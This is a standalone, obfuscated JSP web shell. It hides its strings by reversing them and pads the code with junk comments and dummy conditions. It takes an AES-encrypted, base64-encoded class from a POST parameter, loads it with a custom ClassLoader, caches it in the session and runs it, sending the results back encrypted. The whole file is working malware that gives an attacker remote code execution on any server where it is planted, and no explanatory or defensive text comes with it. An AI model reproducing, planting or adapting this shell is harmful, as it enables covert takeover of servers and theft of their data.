<%!
public static String rs(String s){
    String r = "";
    int length = s.length();
    for (int i = 0; i < length; i++){
        r = s.charAt(i) + r;
    }
    return r;
}
int abcd=114514;
String xc=rs("a84c543b58205123");
String pass=rs("411drowssap");
String k=md5(pass+xc);
class X extends ClassLoader{
    public X(ClassLoader z){
        super(z);
    }public Class Q(byte[] cb){
        if(abcd==abcd){}
        return super.defineClass(cb, 0, cb.length);
    }
}
public byte[] x(byte[] s,boolean m){
    try{
        javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(rs("SEA"));
        c.init(m?1:2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(),rs("SEA")));
        return c.doFinal(s);
        }catch (Exception e){return null; }}
public static String md5(String s) {
    String ret = null;
    try {
        java.security.MessageDigest m;
        m = java.security.MessageDigest.getInstance(rs("5DM"));
        m.update(s.getBytes(), 0, s.length());
        ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
    } catch (Exception e) {}
    return ret;
}
public static String base64Encode(byte[] bs) throws Exception {
Class base64;
String value = null;
try {
    value = (String)java.util.Base64.getEncoder().encodeToString(bs);
} catch (Exception e) {
try {
base64=Class.forName(rs("redocnE46ESAB.csim.nus"));
Object Encoder = base64.newInstance();
value = (String)Encoder
.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
} catch (Exception e2) {}}
return value;
} public static byte[] base64Decode(String bs) throws Exception {
    Class base64;
    byte[] value = null;
    try {
        value = (byte[])java.util.Base64.getDecoder().decode(bs);
    } catch (Exception e) {
    try {
        base64=Class.forName(rs("redoceD46ESAB.csim.nus"));
        Object decoder = base64.newInstance();
        value = (byte[])decoder.getClass()
        .getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
    } catch (Exception e2) {}}return value;
}
%><%
if (request.getMethod().equals("POST") && abcd==abcd){
try{
    byte[] data=base64Decode(request/*jjHnw`]}D`|PI\\7rv?EgvYYwC&9~P"]sh,?:0S&)wu>mQ\'?\'qzP{3*/
    .getParameter(pass));
    data=
    x(data, false);
    if (session
    .getAttribute(rs("daolyap"))==null){
        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
    session
    .setAttribute(rs("daolyap"), new X(contextClassLoader).Q(data));
    }else{/*T0+MdQ{piLt\\wkMzHIc2UxY'vm#Pm?_]1*/
    request/*{(fEyp)RS>#yQCtQa;=UBv#h~J*/
    .setAttribute(rs("sretemarap"),data);
    java.io.ByteArrayOutputStream ao=
    new java.io.ByteArrayOutputStream();
    Object f=/*r=wnIo}DH3EV5d.y+:,g#L{m>pa}b-usUjpy9#95CliAW[NP602XxZ;@xo~v-K46r4\\'VbJ*/
    ((Class)session.getAttribute(rs("daolyap")))/*Y7-!~&CI}pVO\\3LQdLRCWM2Obo\\*/
    .newInstance();
    if(abcd==114514){/*I"DO&{iM~c7|3Mo-7|9\'<egBwY_Xeiu+QB}qk\'$QLiO@g.F]iG8(\'W.FRu0T;~X"CXE@=}oM2i5%SH~-.N&*/
    f.equals(ao);
    if(abcd==abcd && abcd == abcd){
    f.equals(pageContext);
    response.getWriter()
    .write(k.substring(0,16));
    f.toString();}
    response
    .getWriter().write(base64Encode(x(ao/*~O4&M88Pl7X7*X{{stxPsqXgX.{E:x]6~'qGTqvBzOb>ft7)x3%=<_t-]d;F@,;\\K9a~W<1+\\W^*/
    .toByteArray(), true)));
    response.getWriter().write(k.substring(16));
    }}
}catch (Exception e){}}%>